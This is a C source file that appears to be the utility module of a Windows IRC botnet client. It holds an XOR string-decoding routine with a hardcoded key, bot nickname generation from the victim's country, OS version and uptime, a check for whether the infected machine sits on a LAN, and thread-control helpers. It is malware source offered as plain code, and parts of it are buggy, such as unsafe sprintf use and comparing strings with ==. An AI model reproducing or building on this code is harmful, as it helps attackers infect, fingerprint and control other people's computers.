

#include "shared.h"





char decode_key[] = "2jh3iu";





char *GenerateRandomLetters(unsigned int len)
{
	char			*nick;
	unsigned int	i;

	if (len == 0 || len > MAX_RANDOM_LETTERS)
		len = rand()%(MAX_RANDOM_LETTERS-3) + 3;

	nick = (char *) malloc (len + 1);

	for (i = 0; i <= len; i++)
		nick[i] = (rand()%26) + 97;

	nick[len] = 0;

	return nick;
}


char *GenerateNick()
{
	static char nick[32];
	ZeroMemory(nick, 32);

	char strbuf[9];

	sprintf(strbuf,GenerateRandomLetters(8));

	_snprintf(nick, sizeof(nick) - 1, "[%s|%s|%s]%s", GetLocale(), GetOSInfo("os"), GetUptime(), strbuf);

	return nick;
}


char *GetLocale()
{
	static char locale[3];

 	GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SABBREVCTRYNAME, locale, sizeof(locale));

	return locale;
}


char *GetUptime()
{
	static char time[32];

	unsigned int total = GetTickCount() / 1000;
	unsigned int days  = total / 86400;

	if (days < 10)
	{
		sprintf(time, "%.2d", days);
	}
	else
	{
		sprintf(time, "%.2d", days);
	}

	return time;
}


char *GetOSInfo(char *info)
{
	char *os;
	char *version;


		OSVERSIONINFOEX OSVi;
		OSVi.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);

	if (GetVersionEx((OSVERSIONINFO *) &OSVi) ) 
	{
		if(OSVi.dwMajorVersion==5 && OSVi.dwMinorVersion==0)
		{
			os = "2K";
			version = "5.0";
		}
		else if(OSVi.dwMajorVersion==5 && OSVi.dwMinorVersion==1)
		{
			os = "XP";
			version = "5.1";
		}
		else if (OSVi.dwMajorVersion == 5 && OSVi.dwMinorVersion == 2)
		{
			os = "2K3";
			version = "5.1";
		}
		else if(OSVi.dwMajorVersion==6 && OSVi.dwMinorVersion==0 && OSVi.wProductType == VER_NT_WORKSTATION)
		{
			os = "VIS";
			version = "6.0";
		}
		else if(OSVi.dwMajorVersion==6 && OSVi.dwMinorVersion==0 && OSVi.wProductType != VER_NT_WORKSTATION)
		{
			os = "2K8";
			version = "6.0";
		}
		else if(OSVi.dwMajorVersion==6 && OSVi.dwMinorVersion==1 && OSVi.wProductType == VER_NT_WORKSTATION)
		{			
			os = "W7";
			version = "6.0";
		}
		else if(OSVi.dwMajorVersion==6 && OSVi.dwMinorVersion==1 && OSVi.wProductType != VER_NT_WORKSTATION)
		{			
			os = "2K8";
			version = "6.0";
		}
		else
		{
			os = "ERR";
			version = "ERR";
		}
	}

	if (info == "version")
	{
		return version;
	}
	else if (info == "os")
	{
		return os;
	}
	else
	{
		return 0;
	}
}


char *Decode(char *string)
{
	unsigned int	i, 
					j;

	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < strlen(decode_key); j++)
			string[i] ^= decode_key[j];

		string[i] =~ string[i];
	}

	return string;
}



unsigned int Resolve(char *host) 
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = inet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = gethostbyname(host);
        if (hp == 0) 
            return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}


char *GetMyIP(SOCKET sock) 
{
	static char		ip[16];
	SOCKADDR		sa;
	int				sas = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (ip);
}


BOOL IsLanBot(SOCKET sock)
{
	static char		ip[16];
	SOCKADDR		sa;
	int				sas = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	if ((BYTE)sa.sa_data[2] == 192 && (BYTE)sa.sa_data[3] == 168)
		return TRUE;
	else if ((BYTE)sa.sa_data[2] == 10)
		return TRUE;
	else if ((BYTE)sa.sa_data[2] == 172 && (BYTE)sa.sa_data[3] > 15 && (BYTE)sa.sa_data[3] < 32)
		return TRUE;
	else
		return FALSE;
}


void Thread_Prepare()
{
	int		i;
	
	for (i = 0; i < MAX_THREADS; i++)
	{
		threads[i].tHandle = NULL;
		threads[i].type = NONE;
	}
}


int Thread_Add(thread_type type)
{
	int		i;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].tHandle == NULL)
			break;

	if (i == MAX_THREADS)
		i = -1;
	else
		threads[i].type = type;

#ifdef DEBUG
	printf("Adding thread number: %d\n", i);
#endif

	return i;
}


int Thread_Check(thread_type type)
{
	int		i, 
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].type == type)
			k++;

	return k;
}


void Thread_Clear(int num)
{
	threads[num].tHandle = NULL;
	threads[num].type = NONE;
	closesocket(threads[num].tsock);
}


int Thread_Kill(thread_type type)
{
	int		i,
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].type == type)
		{
			TerminateThread(threads[i].tHandle, 0);
			Thread_Clear(i);
			k++;
		}
	}

	return k;
}


HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait)
{
	DWORD		id = 0;
	HANDLE		tHandle;

	tHandle = CreateThread(NULL, 0, function, (LPVOID)param, 0, &id);

	if (wait)
	{
		WaitForSingleObject(tHandle, INFINITE);
		CloseHandle(tHandle);
	}
	else
		Sleep(THREAD_WAIT_TIME);

	return tHandle;
}



